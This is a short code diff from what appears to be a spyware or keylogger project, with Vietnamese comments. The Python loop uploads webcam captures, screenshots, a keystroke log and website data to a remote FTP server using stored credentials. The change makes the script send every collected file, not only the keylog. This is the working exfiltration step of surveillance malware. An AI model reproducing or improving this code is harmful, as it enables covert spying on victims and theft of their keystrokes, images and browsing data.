@@ -21,13 +21,14 @@ def uploadFileFTP(sourceFilePath, destinationDirectory, server, username, passwo
 uid = getCurrentUser()
 sv = getRowValue('FTPServer',uid)
 
-dir_path = "..\\" # thu muc chua file can gui
+dir_path = "..\\..\\" # thu muc chua file can gui
 # cac file can gui
 files = ["Webcam.zip","Screenshot.zip","key_log.txt","Website.zip"]
 #files = ['key_log.txt','acb.txt']
 for f in files:  # add files to the message
     file_path = os.path.join(dir_path, f)
     if (os.path.exists(file_path)):
-        uploadFileFTP('..\\key_log.txt',sv[4],sv[1],sv[2],sv[3])
+        uploadFileFTP(file_path,sv[4],sv[1],sv[2],sv[3])
+        print("upload successfull!!!")
     else:
         print(str(file_path) + " does not exists!!!")
